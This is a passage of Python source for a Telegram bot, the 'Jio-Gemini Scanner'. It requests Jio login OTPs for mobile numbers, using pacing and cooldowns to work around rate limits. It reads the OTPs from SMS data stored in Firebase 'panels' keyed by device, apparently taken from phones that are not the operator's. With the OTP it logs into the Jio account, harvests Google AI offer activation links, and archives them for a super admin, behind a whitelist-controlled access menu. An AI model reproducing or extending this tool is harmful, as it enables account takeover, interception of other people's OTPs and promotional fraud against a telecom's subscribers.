                if code in ("200", "SUCCESS", "0", "true") or "maskedValue" in data:
                    return True, 200
                logger.info(f"send_otp rejected for +91 {mobile[-4:]}: {data}")
                return False, 200
            except Exception:
                return True, 200
        if r.status_code in (400, 429):
            logger.info(f"send_otp HTTP status {r.status_code} for +91 {mobile[-4:]}")
        else:
            logger.info(f"send_otp HTTP status {r.status_code} for +91 {mobile[-4:]}")
        return False, r.status_code
    except Exception as e:
        logger.error(f"send_otp error for +91 {mobile[-4:]}: {e}")
        return False, 0

async def throttled_send_otp(jio: requests.Session, mobile: str) -> Tuple[bool, int]:
    """Sends Jio OTP with mutual exclusion lock, 3.2s pacing, adaptive 16-32s global 429 cooldown, and multi-attempt retry."""
    global _last_jio_req_time, _jio_global_cooldown_until, _jio_consecutive_429
    async with get_jio_otp_lock():
        now = time.time()
        if _jio_global_cooldown_until > now:
            wait_cooldown = _jio_global_cooldown_until - now
            logger.info(f"⏳ Waiting {wait_cooldown:.1f}s for Jio rate limit cooldown before +91 {mobile[-4:]}...")
            await asyncio.sleep(wait_cooldown)
            now = time.time()

        elapsed = now - _last_jio_req_time
        if elapsed < 3.2:
            await asyncio.sleep(3.2 - elapsed)
        _last_jio_req_time = time.time()

        loop = asyncio.get_running_loop()
        ok, status_code = await loop.run_in_executor(_SCAN_EXECUTOR, send_otp, jio, mobile)

        # Multi-attempt retry loop on 429 so numbers are not dropped prematurely
        max_429_retries = 2
        attempt_429 = 0
        while not ok and status_code == 429 and attempt_429 < max_429_retries:
            attempt_429 += 1
            _jio_consecutive_429 += 1
            cooldown = min(16.0 + (_jio_consecutive_429 - 1) * 4.0, 32.0)
            _jio_global_cooldown_until = time.time() + cooldown
            logger.info(f"⏳ Jio rate limit (HTTP 429, streak={_jio_consecutive_429}) for +91 {mobile[-4:]}. Adaptive cooling {cooldown:.0f}s (Attempt {attempt_429}/{max_429_retries})...")
            await asyncio.sleep(cooldown)
            _last_jio_req_time = time.time()
            ok, status_code = await loop.run_in_executor(_SCAN_EXECUTOR, send_otp, jio, mobile)
            if ok:
                _jio_consecutive_429 = 0
                _jio_global_cooldown_until = 0.0
                logger.info(f"✅ Jio rate limit cleared after cooldown for +91 {mobile[-4:]}!")
                break

        if ok:
            _jio_consecutive_429 = 0
        elif status_code == 429:
            _jio_global_cooldown_until = time.time() + 15.0

        return ok, status_code

def verify_otp(s: requests.Session, mobile: str, otp: str) -> bool:
    try:
        payload = {
            "mobileNumber": mobile,
            "otp": otp,
            "loginFlowType": "MOBILE"
        }
        r = s.post(VERIFY_OTP_URL, json=payload, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            try:
                data = r.json()
                code = str(data.get("responseCode") or data.get("statusCode") or data.get("status") or "")
                token = data.get("ssoToken") or data.get("token")
                if not token and isinstance(data.get("data"), dict):
                    token = data["data"].get("ssoToken") or data["data"].get("token")
                if token:
                    s.headers["sso-token"] = str(token)
                    s.headers["token"] = str(token)
                    s.cookies.set("ssoToken", str(token), domain=".jio.com")

                if code in ("200", "SUCCESS", "0", "true") or token or data.get("loginSuccess") is True:
                    return True
                resp_text = str(data).lower()
                if any(k in resp_text for k in ("invalid", "fail", "incorrect", "expired", "error")):
                    return False
                return True
            except Exception:
                return True
        return False
    except Exception as e:
        logger.error(f"verify_otp error for +91 {mobile[-4:]}: {e}")
        return False

async def wait_otp(
    fb: requests.Session,
    url: str,
    key: str,
    device: str,
    known: Set[str],
    jio: requests.Session,
    mobile: str,
    request_start_time: float,
    dev_data: Optional[dict] = None,
    base_path: str = "clients",
    timeout: Optional[int] = None,
    session: Optional[UserScanSession] = None
) -> bool:
    used = set()
    eff_timeout = timeout if timeout is not None else SCAN_CONFIG["timeout"]
    deadline = time.time() + eff_timeout
    poll_count = 0
    loop = asyncio.get_running_loop()
    active_dev_data = dev_data
    while time.time() < deadline and (not session.stop_requested if session else True):
        poll_count += 1
        if poll_count % 2 == 0 or not active_dev_data:
            fresh = await loop.run_in_executor(_SCAN_EXECUTOR, fb_get, fb, url, key, f"{base_path.strip('/')}/{device}")
            if fresh and isinstance(fresh, dict):
                active_dev_data = fresh

        msgs = await loop.run_in_executor(_SCAN_EXECUTOR, get_messages, fb, url, key, device, 25, active_dev_data, base_path)
        for mk, item in msgs.items():
            if mk in known or mk in used:
                continue

            # Skip messages older than 3 minutes prior to request (Jio OTP expires in 3 mins)
            msg_ts = get_message_timestamp(item)
            if msg_ts:
                if (request_start_time - msg_ts) > 180:
                    continue
                if (msg_ts - request_start_time) > 300:
                    continue

            sender = str(item.get("address") or item.get("sender") or item.get("originatingAddress") or "")
            text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
            otp = extract_otp(text, sender)
            if otp:
                used.add(mk)
                logger.info(f"Found OTP {otp} for +91 {mobile[-4:]}, verifying...")
                ok = await loop.run_in_executor(_SCAN_EXECUTOR, verify_otp, jio, mobile, otp)
                if ok:
                    logger.info(f"OTP verified successfully for +91 {mobile[-4:]}")
                    return True
                else:
                    logger.info(f"OTP {otp} verification rejected for +91 {mobile[-4:]}")
        await asyncio.sleep(POLL_INTERVAL)
    return False

def is_already_active(text: str) -> bool:
    if not text:
        return False
    t = " ".join(str(text).lower().replace("_", " ").split())
    if any(p in t for p in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed", "already in use",
        "link has already been used", "already used"
    )):
        return True
    if "already" in t and any(w in t for w in ("active", "activated", "redeemed", "claimed", "availed", "used", "subscription", "plan")):
        return True
    return False

def get_activation_url(s: requests.Session) -> Tuple[str, str]:
    try:
        dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
        offer_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"}

        # 1. Auth verification
        r = s.get(AUTH_URL, headers=dashboard_headers, timeout=REQUEST_TIMEOUT)
        data = r.json() if r.status_code == 200 else {}
        is_logged_in = (
            str(data.get("loginFlag", "")).lower() == "true"
            or bool(data.get("ssoToken"))
            or bool(data.get("customerId"))
            or str(data.get("statusCode", "")).lower() in ("200", "0", "success")
        )
        if not is_logged_in:
            return "auth_failed", ""

        # 2. OTT Navigate call
        try:
            s.get("https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241", headers=dashboard_headers, timeout=10)
        except Exception:
            pass

        # 3. Activate endpoint
        try:
            act_resp = s.get(ACTIVATE_URL, headers=offer_headers, timeout=REQUEST_TIMEOUT)
            if act_resp.status_code == 200:
                act_text = act_resp.text
                if is_already_active(act_text):
                    return "already_active", ""
                url = extract_activation_url_from_text(act_text)
                if url:
                    return "success", url
        except Exception as e:
            logger.debug(f"Error calling ACTIVATE_URL: {e}")

        # 4. Google AI endpoint
        try:
            g_resp = s.get(GOOGLE_URL, headers=offer_headers, timeout=REQUEST_TIMEOUT)
            if g_resp.status_code == 200:
                g_text = g_resp.text
                if is_already_active(g_text):
                    return "already_active", ""
                try:
                    g_data = g_resp.json()
                    redir = g_data.get("redirectionURL") or g_data.get("activationURL") or g_data.get("url")
                    if redir:
                        url = extract_activation_url_from_text(redir)
                        if url:
                            try:
                                s.get("https://www.jio.com/api/jio-ott-service/ott/submission/submit", headers=offer_headers, timeout=10)
                            except Exception:
                                pass
                            return "success", url
                except Exception:
                    pass
                url = extract_activation_url_from_text(g_text)
                if url:
                    return "success", url
        except Exception as e:
            logger.debug(f"Error calling GOOGLE_URL: {e}")

        # Fallback endpoints
        fallback_endpoints = [
            "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=MYJIO",
            "https://www.jio.com/api/jio-ott-service/ott/subscription/coupons"
        ]
        for ep in fallback_endpoints:
            try:
                resp = s.get(ep, headers=offer_headers, timeout=REQUEST_TIMEOUT)
                if resp.status_code == 200:
                    if is_already_active(resp.text):
                        return "already_active", ""
                    url = extract_activation_url_from_text(resp.text)
                    if url:
                        return "success", url
            except Exception:
                continue

        return "no_url", ""
    except Exception as e:
        logger.error(f"Error in get_activation_url: {e}")
        return f"error: {e}", ""

def save_result(user_id_or_serial: Any, device_or_serial: Any, mobile_or_dev: Any, status_or_mob: Any, url_or_status: Any, maybe_url: str = "") -> bool:
    # Support both save_result(user_id, serial, device, mobile, status, url) and legacy save_result(serial, device, mobile, status, url)
    if maybe_url != "" or (isinstance(user_id_or_serial, int) and user_id_or_serial > 100000):
        user_id = user_id_or_serial
        serial = device_or_serial
        device = mobile_or_dev
        mobile = status_or_mob
        status = url_or_status
        url = maybe_url
    else:
        user_id = None
        serial = user_id_or_serial
        device = device_or_serial
        mobile = mobile_or_dev
        status = status_or_mob
        url = url_or_status

    clean_url = url.strip() if url else ""
    is_duplicate_unredeemed = False
    if clean_url and is_url_previously_captured(clean_url):
        is_duplicate_unredeemed = True
        status = "duplicate_unredeemed"

    date, tm = get_current_time()
    results_f = get_user_results_file(user_id)
    exists = results_f.exists() and results_f.stat().st_size > 0
    with open(results_f, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if not exists:
            w.writerow(["serial", "device", "mobile", "status", "url", "date", "time"])
        w.writerow([serial, device, mobile, status, url, date, tm])

    # Record in deduplication and cooldown database for all scan results
    record_number_processed(user_id, mobile, status, url)

    if clean_url:
        # STRICT DEDUPLICATION: Skip duplicate delivery if URL/token was already captured previously!
        if is_duplicate_unredeemed:
            logger.info(f"🔁 [UNREDEEMED DUPLICATE] URL for +91 {str(mobile)[-4:]} was already captured previously! Skipping duplicate delivery.")
            return False

        # Register as newly captured lifetime URL
        register_captured_url(clean_url)

        # 1. Session fresh links file (isolated per scan run - 100% UNUSED & UNIQUE)
        fresh_f = get_user_fresh_links_file(user_id)
        with open(fresh_f, "a", encoding="utf-8") as f:
            f.write(clean_url + "\n")

        # 2. Cumulative lifetime archive
        links_f = get_user_links_file(user_id)
        existing = set()
        if links_f.exists():
            existing = set(links_f.read_text(encoding="utf-8", errors="ignore").splitlines())
        if clean_url not in existing:
            with open(links_f, "a", encoding="utf-8") as f:
                f.write(clean_url + "\n")

        # Also mirror to Super Admin's master links repository (Unique Only)
        super_uid = admin_manager.super_admin_id
        if super_uid and user_id != super_uid:
            s_fresh_f = get_user_fresh_links_file(super_uid)
            with open(s_fresh_f, "a", encoding="utf-8") as f:
                f.write(clean_url + "\n")
            s_links_f = get_user_links_file(super_uid)
            s_existing = set()
            if s_links_f.exists():
                s_existing = set(s_links_f.read_text(encoding="utf-8", errors="ignore").splitlines())
            if clean_url not in s_existing:
                with open(s_links_f, "a", encoding="utf-8") as f:
                    f.write(clean_url + "\n")

        return True

    return False

# ============ PROGRESS BAR & ETA CALCULATOR ============
def get_progress_bar(percentage: float, length: int = 12) -> str:
    clamped = max(0.0, min(100.0, float(percentage)))
    filled = int(round(length * (clamped / 100.0)))
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {int(clamped)}%"

def format_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    mins, secs = divmod(seconds, 60)
    if mins < 60:
        return f"{mins:02d}m {secs:02d}s"
    hrs, mins = divmod(mins, 60)
    return f"{hrs:02d}h {mins:02d}m"

def calculate_eta(session_or_stats: Any = None) -> Tuple[str, str]:
    """Computes moving average dynamic ETA and estimated finish clock time in IST."""
    if isinstance(session_or_stats, UserScanSession):
        stats = session_or_stats.stats
    elif isinstance(session_or_stats, dict):
        stats = session_or_stats
    else:
        stats = scan_stats

    start_t = stats.get("start_time")
    total_batches = stats.get("total_batches", 0)
    batches_done = stats.get("last_batch_idx", 0)
    if total_batches <= 0:
        return "Calculating...", "--:--"

    rem_batches = max(0, total_batches - batches_done)
    if rem_batches == 0:
        return "00m 00s", "Completed 🏁"

    batch_times = stats.get("batch_times", [])
    if batch_times:
        avg_per_batch = max(1.0, sum(batch_times) / len(batch_times))
    elif batches_done > 0 and start_t:
        elapsed = time.time() - start_t
        avg_per_batch = max(1.0, elapsed / batches_done)
    else:
        mode = stats.get("mode", "deep")
        avg_per_batch = 6.0 if mode == "turbo" else 10.0

    est_remaining_sec = int(rem_batches * avg_per_batch)
    rem_str = format_duration(est_remaining_sec)
    utc_now = datetime.now(timezone.utc)
    finish_dt = utc_now + timedelta(hours=TIMEZONE_OFFSET_HOURS, seconds=est_remaining_sec)
    finish_clock = finish_dt.strftime("%I:%M %p (IST)")
    return rem_str, finish_clock

async def update_progress(context: ContextTypes.DEFAULT_TYPE, session_or_msg: Any, msg_or_force: Any = False, force: bool = False):
    global last_progress_time
    if isinstance(session_or_msg, UserScanSession):
        session = session_or_msg
        if session.stop_requested:
            return
        msg = str(msg_or_force)
        target_cid = session.chat_id
        target_mid = session.progress_msg_id
        last_t = session.last_progress_time
        curr_stats = session.stats
    else:
        session = None
        msg = str(session_or_msg)
        force = bool(msg_or_force)
        target_cid = chat_id
        target_mid = progress_msg_id
        last_t = last_progress_time
        curr_stats = scan_stats

    if not target_mid or not target_cid:
        return

    now = time.time()
    if not force and (now - last_t) < 2.0:
        return

    try:
        _, local_ts = get_current_time()
        safe_msg = html.escape(msg)

        total_batches = curr_stats.get("total_batches", 1)
        curr_batch = curr_stats.get("last_batch_idx", 0)
        pct = (curr_batch / total_batches * 100.0) if total_batches > 0 else 0.0
        pbar = get_progress_bar(pct)
        eta_rem, finish_time = calculate_eta(curr_stats)

        success_count = curr_stats.get("success_count", 0)
        failed_count = curr_stats.get("failed_count", 0)
        online_count = curr_stats.get("online_devices", 0)

        text = (
            f"⚡ <b>2x2 Jio-Gemini Scanner Active</b>\n\n"
            f"📊 <b>Loading Progress:</b>\n"
            f"<code>{pbar}</code> ({curr_batch}/{total_batches} Batches)\n\n"
            f"📍 <b>Status:</b> <code>{safe_msg}</code>\n"
            f"🎯 <b>Hits:</b> <b>{success_count}</b> | "
            f"❌ <b>Failed:</b> <code>{failed_count}</code> | "
            f"📱 <b>Online:</b> <code>{online_count}</code>\n\n"
            f"⏳ <b>Estimated Time:</b> <code>~{eta_rem}</code>\n"
            f"🏁 <b>Est. Completion:</b> <code>{finish_time}</code>\n"
            f"🕒 <i>Last updated: {local_ts} (IST)</i>"
        )

        scan_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 Stop Scan", callback_data='stop'), InlineKeyboardButton("📈 Live Status", callback_data='status')]
        ])

        await context.bot.edit_message_text(
            chat_id=target_cid,
            message_id=target_mid,
            text=text,
            reply_markup=scan_markup,
            parse_mode=ParseMode.HTML
        )
        if session:
            session.last_progress_time = now
        else:
            last_progress_time = now
    except Exception as e:
        if session:
            session.last_progress_time = now
        else:
            last_progress_time = now
        logger.debug(f"Progress update skipped: {e}")

async def safe_telegram_call(coro_func, *args, max_retries: int = 3, default_return = None, **kwargs):
    """
    Executes a Telegram API call function with automatic RetryAfter backoff and error recovery.
    Handles flood limits by waiting the requested retry_after delay and retrying.
    Also handles transient timeouts and network disconnects gracefully.
    """
    for attempt in range(max_retries):
        try:
            return await coro_func(*args, **kwargs)
        except RetryAfter as e:
            wait_s = int(e.retry_after) + 1
            logger.info(f"Telegram Flood Control: sleeping {wait_s}s before retrying (attempt {attempt+1}/{max_retries})...")
            if attempt < max_retries - 1 and wait_s <= 65:
                await asyncio.sleep(wait_s)
            else:
                logger.error(f"Telegram RetryAfter limit exceeded ({wait_s}s).")
                return default_return
        except (TimedOut, NetworkError) as e:
            if attempt < max_retries - 1:
                logger.debug(f"Telegram network transient issue ({e}); retrying in 1.5s...")
                await asyncio.sleep(1.5)
            else:
                logger.debug(f"Telegram network error after {max_retries} attempts: {e}")
                return default_return
        except Exception as e:
            err_msg = str(e)
            if "Message is not modified" in err_msg or "Query is already answered" in err_msg:
                return default_return
            logger.debug(f"Telegram API call error: {e}")
            return default_return
    return default_return

async def safe_answer(query_or_update, text: Optional[str] = None, show_alert: bool = False):
    """
    Safely answers a Telegram CallbackQuery.
    Guarantees no unhandled exceptions if:
    - Query was already answered (BadRequest: Query is already answered)
    - Query expired / too old (BadRequest: Query ID is invalid)
    - Network glitches during callback answering
    """
    if not query_or_update:
        return
    query = getattr(query_or_update, "callback_query", query_or_update)
    if not query or not hasattr(query, "answer"):
        return
    try:
        if text is not None:
            clean_text = str(text)
            if show_alert and len(clean_text) > 195:
                clean_text = clean_text[:192] + "..."
            await query.answer(text=clean_text, show_alert=show_alert)
        else:
            await query.answer()
    except Exception as e:
        logger.debug(f"safe_answer suppressed exception: {e}")

async def send_or_edit(
    update: Update,
    text: str,
    reply_markup: Optional[InlineKeyboardMarkup] = None,
    parse_mode: Optional[str] = ParseMode.HTML,
    disable_web_page_preview: bool = True
) -> Optional[Message]:
    """
    Seamlessly edits the current message if triggered via an inline button (callback query).
    Ignores 'Message is not modified' error so no duplicate message is sent, and dismisses button loading state.
    Only sends a new message if there is no callback query (e.g. user typed a command)
    or if editing the message genuinely failed (e.g. message was deleted).
    """
    query = update.callback_query
    if query and query.message:
        try:
            return await safe_telegram_call(
                query.edit_message_text,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup,
                disable_web_page_preview=disable_web_page_preview
            )
        except Exception as e:
            err_str = str(e)
            if "Message is not modified" in err_str:
                await safe_answer(query)
                return query.message
            logger.debug(f"edit_message_text failed ({e}); falling back to sending a new message.")

    if update.effective_message:
        return await safe_telegram_call(
            update.effective_message.reply_text,
            text=text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
            disable_web_page_preview=disable_web_page_preview
        )
    return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    admin_manager.record_user(user_id, user.username if user else "", user.first_name if user else "")

    if not admin_manager.has_access(user_id):
        user_fname = (user.first_name or "User") if user else "User"
        auth_text = f"""⛔ <b>Access Denied / Not Authorized</b>

👋 Hello <b>{html.escape(user_fname)}</b>!

⚠️ You are <b>not authorized</b> to use this bot.
The bot is currently running in <b>Private Mode</b> (Free Mode is OFF).

🆔 <b>Your User ID:</b> <code>{user_id}</code>

👉 Send your User ID to the Super Admin (<b>@OwAtom</b>) to get access."""

        keyboard = [
            [InlineKeyboardButton("💬 Contact Support to Get Access", url="https://t.me/OwAtom")],
            [InlineKeyboardButton("🆔 Copy My ID", callback_data='btn_my_id'), InlineKeyboardButton("🔄 Check Access", callback_data='start_menu')]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        await send_or_edit(update, auth_text, reply_markup=markup)
        return

    role_label = admin_manager.get_user_role_label(user_id)
    log_ch_disp = admin_manager.get_display_log_channel(user_id)
    storage_ch_disp = admin_manager.get_display_storage_channel(user_id)
    is_super = admin_manager.is_super_admin(user_id)

    user_scanning = is_user_scanning(user_id)
    status_emoji = "🟢 RUNNING" if user_scanning else "⚪ IDLE"
    user_fname = (user.first_name or "User") if user else "User"
    text = f"""👋 Hello <b>{html.escape(user_fname)}</b>!

🤖 <b>Jio-Gemini Scanner Bot (Isolated Multi-User)</b>

🆔 <b>User ID:</b> <code>{user_id}</code> | 🔒 <b>Role:</b> {role_label}
⚡ <b>Your Scanner:</b> <b>{status_emoji}</b>
📡 <b>Log Channel:</b> <code>{log_ch_disp}</code>
📦 <b>Storage Channel:</b> <code>{storage_ch_disp}</code>

<i>Select a category below to access controls:</i>"""

    keyboard = [
        [InlineKeyboardButton("⚡ Scanner Hub", callback_data='menu_scanner'), InlineKeyboardButton("📂 Panels & Data", callback_data='menu_panels')],
        [InlineKeyboardButton("📥 Export Hub", callback_data='menu_export'), InlineKeyboardButton("📡 Channels & Logs", callback_data='menu_channels')],
        [InlineKeyboardButton("❓ Help & User Guide", callback_data='menu_help')]
    ]
    if is_super:
        keyboard.append([InlineKeyboardButton("👑 Super Admin Suite", callback_data='menu_admin')])
    elif admin_manager.is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🛡️ Admin Suite", callback_data='menu_admin')])

    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def show_scanner_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        return

    panels = load_panels(user_id)
    user_scanning = is_user_scanning(user_id)
    session = active_scans.get(user_id)
    user_cfg = get_user_scan_config(user_id)

    state_str = "🟢 <b>Scanning Active</b>" if user_scanning else "⚪ <b>Idle / Stopped</b>"
    mode_str = "⚡ <b>Turbo Mode</b> (Fast 1x, 18s)" if user_cfg["mode"] == "turbo" else "🔍 <b>Deep Mode</b> (2x Retry)"

    if user_scanning and session:
        success_c = session.stats.get("success_count", 0)
        failed_c = session.stats.get("failed_count", 0)
    else:
        st = load_scan_state(user_id) or {}
        success_c = st.get("success", 0)
        failed_c = st.get("failed", 0)

    has_storage = admin_manager.has_storage_channel(user_id)
    storage_display = admin_manager.get_display_storage_channel(user_id)
    storage_line = f"• <b>Storage Channel:</b> <code>{storage_display}</code>"
    if not has_storage:
        storage_line += " ⚠️ <b>(Required before scan!)</b>"

    text = f"""⚡ <b>Scanner Control Hub</b>

• <b>Status:</b> {state_str}
• <b>Active Mode:</b> {mode_str}
• <b>Panels Loaded:</b> <code>{len(panels)}</code>
• <b>Success / Failed:</b> <code>{success_c}</code> / <code>{failed_c}</code>
{storage_line}

<i>Use the buttons below to control the scanner:</i>"""

    mode_btn = "⚡ Mode: Turbo (1x)" if user_cfg["mode"] == "turbo" else "🔍 Mode: Deep (2x)"
    saved_st = load_scan_state(user_id)
    has_unfinished = (
        saved_st is not None
        and not saved_st.get("finished", False)
        and saved_st.get("last_batch_idx", 0) > 0
        and (saved_st.get("total_batches", 0) == 0 or saved_st.get("last_batch_idx", 0) < saved_st.get("total_batches", 0))
    )

    action_rows = []
    if user_scanning:
        action_rows.append([InlineKeyboardButton("🛑 Stop Scan", callback_data='stop'), InlineKeyboardButton("📈 Live Status", callback_data='status')])
    elif has_unfinished:
        action_rows.append([InlineKeyboardButton("⏯️ Continue Previous Scan", callback_data='scan_resume')])
        action_rows.append([InlineKeyboardButton("🔄 Run New Scan", callback_data='scan_fresh'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')])
        action_rows.append([InlineKeyboardButton("📈 Live Status", callback_data='status')])
    else:
        action_rows.append([InlineKeyboardButton("🚀 Start Scan", callback_data='scan'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')])
        action_rows.append([InlineKeyboardButton("📈 Live Status", callback_data='status')])

    keyboard = [
        *action_rows,
        [InlineKeyboardButton(f"⚙️ {mode_btn} (Toggle)", callback_data='toggle_scan_mode')],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def show_panels_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        return

    panels = load_panels(user_id)
    total_count = len(panels)
    preview = "\n".join([f"• <code>{p[0]}</code>" for p in panels[:4]])
    if total_count > 4:
        preview += f"\n<i>... and {total_count - 4} more panels</i>"

    storage_ch = admin_manager.get_display_storage_channel(user_id)

    text = f"""📂 <b>Panels & Data Workspace</b>

• <b>Panels Loaded:</b> <code>{total_count}</code>
• <b>Storage Channel:</b> <code>{storage_ch}</code>

<b>Sample Panels:</b>
{preview if preview else '<i>No panels loaded yet.</i>'}

💡 <b>Tip:</b> You can paste Firebase URLs in chat anytime to merge directly into your workspace!"""

    keyboard = [
        [InlineKeyboardButton("📋 View Panels", callback_data='panels_menu'), InlineKeyboardButton("🧪 Health Ping", callback_data='panels_ping')],
        [InlineKeyboardButton("📤 Upload File", callback_data='upload'), InlineKeyboardButton("📥 Export Hub", callback_data='menu_export')],
        [InlineKeyboardButton("📊 Results CSV", callback_data='results'), InlineKeyboardButton("📦 Cloud Restore", callback_data='restore_panels')],
        [InlineKeyboardButton("🗑️ Clear Panels", callback_data='clear_panels')],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def show_channels_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        return

    log_ch = admin_manager.get_display_log_channel(user_id)
    storage_ch = admin_manager.get_display_storage_channel(user_id)
    is_super = admin_manager.is_super_admin(user_id)

    storage_note = ""
    if not is_super and not admin_manager.has_storage_channel(user_id):
        storage_note = "\n⚠️ <b>Storage Channel is COMPULSORY for scanning!</b> Link your channel below."

    text = f"""📡 <b>Channel Connections & Storage Hub</b>

• <b>Your Log Channel:</b> <code>{log_ch}</code>
• <b>Your Storage Channel:</b> <code>{storage_ch}</code>{storage_note}

<b>Quick Commands:</b>
• <code>/setstorage &lt;id&gt;</code> - Link private storage (Compulsory)
• <code>/setchannel &lt;id&gt;</code> - Link private log channel
• <code>/setchannel off</code> - Disable log streaming

💡 <i>To find your channel ID, add this bot as Admin in your channel and type <code>/id</code>.</i>"""

    keyboard = [
        [InlineKeyboardButton("🧪 Test Log Ping", callback_data='channel_test'), InlineKeyboardButton("📦 Test Storage", callback_data='storage_test')],
        [InlineKeyboardButton("⚪ Disable Log", callback_data='channel_off'), InlineKeyboardButton("⚪ Disable Storage", callback_data='storage_off')],
        [InlineKeyboardButton("❓ Connection Help", callback_data='channel_help'), InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_admin(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Admin Access Required", show_alert=True)
        else:
            await update.effective_message.reply_text("⛔ <b>Admin Access Required</b>", parse_mode=ParseMode.HTML)
        return

    is_super = admin_manager.is_super_admin(user_id)
    header_title = "👑 <b>Super Admin Control Hub</b>" if is_super else "🛡️ <b>Admin Control Hub</b>"
    uptime_sec = int(time.time() - admin_manager.bot_start_time)
    uptime_str = format_duration(uptime_sec)
    users = admin_manager.get_all_accounts()
    free_mode_status = "🟢 ON (Open)" if admin_manager.is_free_mode() else "🔴 OFF (Whitelist Only)"

    running_scans = [s for s in list(active_scans.values()) if s.is_active()]
    if running_scans:
        users_running = ", ".join([f"<code>{s.user_id}</code> ({html.escape(s.user_info.get('first_name') or 'User')})" for s in running_scans])
        active_scan_str = f"🟢 <b>{len(running_scans)} Running</b> ({users_running})"
    else:
        active_scan_str = "⚪ <b>Idle</b> (0 active scans)"

    text = f"""{header_title}

• <b>Bot Uptime:</b> <code>{uptime_str}</code>
• <b>Free Mode:</b> <b>{free_mode_status}</b>
• <b>Registered Users:</b> <code>{len(users)}</code>
• <b>Master Log:</b> <code>{admin_manager.get_master_log_channel()}</code>
• <b>Master Storage:</b> <code>{admin_manager.get_master_storage_channel()}</code>
• <b>Active Scans:</b> {active_scan_str}"""

    keyboard = [
        [InlineKeyboardButton("👥 Manage Users", callback_data='users_list')]
    ]
    if is_super:
        free_btn = "🔓 Free Mode: ON" if admin_manager.is_free_mode() else "🔒 Free Mode: OFF"
        keyboard[0].append(InlineKeyboardButton(free_btn, callback_data='toggle_freemode'))
        keyboard.append([InlineKeyboardButton("🧹 Memory Cleanup", callback_data='cleanup')])

    keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')])
    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_help_menu(update, context)

async def show_help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    first_name = html.escape(user.first_name if user else "User")

    is_super = admin_manager.is_super_admin(user_id)
    is_adm = admin_manager.is_admin(user_id)
    has_acc = admin_manager.has_access(user_id)

    if not has_acc:
        # ⚪ Guest View (Access Restricted)
        text = f"""👋 Hello <b>{first_name}</b>!

❓ <b>Jio-Gemini Bot — Access Guide</b>
🔒 <b>Role:</b> ⚪ Guest (Authorization Required)
🆔 <b>Your User ID:</b> <code>{user_id}</code>

⚠️ <b>Access Restricted:</b>
This bot is operating in <b>Whitelist-Only</b> mode. You need authorization from the Super Admin to access the scanner and panel database.

<b>📋 How to Get Access:</b>
1. Copy your User ID: <code>{user_id}</code>
2. Send your ID to the Bot Owner / Super Admin (<b>@OwAtom</b>).
3. Once whitelisted, type <code>/start</code> to access all bot tools.

<b>Available Commands:</b>
• <code>/id</code> or <code>/chatid</code> — Inspect your Telegram User ID
• <code>/help</code> — View this access guide"""

        keyboard = [
            [InlineKeyboardButton("🆔 Copy My ID", callback_data='btn_my_id'), InlineKeyboardButton("🔄 Check Access", callback_data='start_menu')],
            [InlineKeyboardButton("💬 Contact Support (@OwAtom)", url="https://t.me/OwAtom")]
        ]

    elif is_super:
        # 👑 Super Admin / Owner View
        master_log = admin_manager.get_master_log_channel()
        master_storage = admin_manager.get_master_storage_channel()
        text = f"""👑 <b>Jio-Gemini Bot — Super Admin Manual</b>

👑 <b>Role:</b> 👑 Super Admin / Owner | 🆔 <code>{user_id}</code>
📡 <b>Master Log Channel:</b> <code>{master_log}</code>
📦 <b>Master Storage Channel:</b> <code>{master_storage}</code>
💬 <b>Support Handle:</b> @OwAtom

<b>👑 Super Admin Exclusive Commands:</b>
